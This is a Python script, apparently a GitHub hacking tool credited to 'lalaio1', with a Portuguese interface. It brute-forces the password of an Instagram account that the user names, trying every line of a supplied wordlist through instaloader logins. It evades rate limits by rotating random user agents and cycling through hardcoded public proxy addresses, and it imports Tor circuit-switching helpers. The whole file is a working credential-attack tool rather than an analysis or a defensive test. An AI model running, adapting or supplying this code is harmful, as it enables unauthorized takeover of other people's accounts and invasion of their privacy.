import requests
import os
import instaloader
import time
import random
from rich.panel import Panel
from rich.console import Console
from rich import print
from intro import *
import json
from stem import Signal
from stem.control import Controller

def conectar_tor():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

def configurar_tor():
    requests.get('http://127.0.0.1:9050')


def testar_proxy_valido(proxy):
    try:
        sessao = requests.Session()
        sessao.proxies = {"http": proxy, "https": proxy}

        resposta = sessao.get("https://www.instagram.com", timeout=10)

        if resposta.status_code == 200:
            return True
        else:
            return False

    except requests.RequestException:
        return False


def obter_novo_proxy():
    novo_proxy = input("\n[?] Insira um novo proxy no formato 'ip:porta': ")
    return novo_proxy

def limpar_tela():
    os.system('cls' if os.name == 'nt' else 'clear')

with open('./conf/json/agent/agents.json', 'r') as agents_file:
    lista_agentes = json.load(agents_file)

class Cores:
    NEGRITO = '\033[1m'
    ROXO = '\033[95m'
    AZUL_CLARO = '\033[94m'
    VERDE = '\033[95m'
    AMARELO = '\033[93m'
    MAGENTA = '\033[95m'
    FALHA = '\033[91m'
    FIM = '\033[0m'
    SUBLINHADO = '\033[4m'

start()
lista_codigos = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
                 "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]

L = instaloader.Instaloader()

verificar_interromper = "no"

while True:
    if verificar_interromper == "si":
        break
    USUARIO = ""
    USUARIO = input('\033[90m[\033[91m?\033[90m]] \033[92m INSIRA O NOME DE USUÁRIO DO INSTAGRAM PARA QUEBRAR A SENHA \n  ' '└─> ')
    lista_senhas = input("\n[?] Insira a Lista de Senhas ao Longo do Caminho " '\n └─> ')
    dormir = 0
    break

arquivo_senhas = open(lista_senhas, 'r')
Linhas = arquivo_senhas.readlines()
contador = 0
limpar_tela()

console = Console()

console.print(Panel( '''

      .---.        .-----------
     /     \  __  /    ------
    / /     \(  )/    -----
   //////   ' \/ `   ---
  //// / // :    : ---
 // /   /  /`    '--
//          //..\\\

       ====UU====UU====
           '//||\\\`
             ''``


[bold red] LIBinsta Por // lalaio1 
'''))

console.print(Panel('''
[bold white][[bold red]^[bold white]] [bold green] Por: lalaio1
[bold white][[bold red]^[bold white]] [bold green] Github: lalaio1
[bold white][[bold red]^[bold white]] [bold green] Discord: lalaio1 
 '''))


http_proxy = "http://10.10.1.10:3128"
https_proxy = "https://10.10.1.11:1080"
ftp_proxy = "ftp://10.10.1.10:3128"
proxyDict = {
    "http": "120.236.74.213:9002, 188.123.114.167:80, 185.82.139.1:443, 1.10.231.42:8080",
    "https": "158.69.53.98:9300, 193.201.228.121:80, 31.186.239.245:8080, 112.217.162.5:3128",
    "ftp": "36.91.166.98:8080, 188.132.222.3:8080, 188.132.221.24:8080, 185.230.48.164:32650"
}

tentativas_falhadas = 0
usar_proxy = False
lista_proxies = ["120.236.74.213:9002", "188.123.114.167:80", "185.82.139.1:443"]
indice_proxy = 0

for linha in Linhas:
    try:
        SENHA = ""
        contador += 1
        senha_teste = linha.strip()
        SENHA = senha_teste
        codigo_escolhido = random.choice(lista_codigos)
        time.sleep(5)
        console.print(f"\n[bold yellow] [+] Testando senha: {senha_teste}")

        if usar_proxy:
            sessao = requests.Session()
            sessao.proxies = {"http": lista_proxies[indice_proxy]}
            L.context._session = sessao

        L.context.user_agent = random.choice(lista_agentes)

        if usar_proxy:
            while not testar_proxy_valido(lista_proxies[indice_proxy]):
                console.print("[bold red] [!] Proxy inválido. Insira um novo proxy.")
                novo_proxy = obter_novo_proxy()
                lista_proxies[indice_proxy] = novo_proxy

            sessao = requests.Session()
            sessao.proxies = {"http": lista_proxies[indice_proxy]}
            L.context._session = sessao


        L.context.user_agent = random.choice(lista_agentes)

        L.login(USUARIO, SENHA)
        console.print(f"\n[bold green] [[✓] Senha encontrada: {senha_teste}")
        verificar_interromper = "si"
        break

    except instaloader.exceptions.BadCredentialsException:
        console.print(f"[bold red] [+] Senha incorreta: {senha_teste}")
        tentativas_falhadas += 1
        if tentativas_falhadas >= 9:
            usar_proxy = True
            tentativas_falhadas = 0 
            indice_proxy = (indice_proxy + 1) % len(lista_proxies)
            console.print(f"[bold blue] [!] Alternando para novo servidor proxy: {lista_proxies[indice_proxy]}")

    except instaloader.exceptions.ConnectionException:
        console.print(f"\n[bold red] [!] Conexão instável, trocando User Agent, trocando proxy e esperando 10 segundos...")

        L.context.user_agent = random.choice(lista_agentes)

        usar_proxy = True
        indice_proxy = (indice_proxy + 1) % len(lista_proxies)
        console.print(f"[bold blue] [!] Alternando para novo servidor proxy: {lista_proxies[indice_proxy]}")
        sessao = requests.Session()
        sessao.proxies = {"http": lista_proxies[indice_proxy]}
        L.context._session = sessao

        time.sleep(10)

    except instaloader.exceptions.InvalidArgumentException:
        console.print(f"\n[bold blue] [-] Nome de usuário não encontrado")

arquivo_senhas.close()
L.close()
console.print(f"\n[bold green] [+] Concluído..!!")
console.print(f"[bold yellow] [!] Se você não obteve a senha, tente outra lista de senhas")
exit()
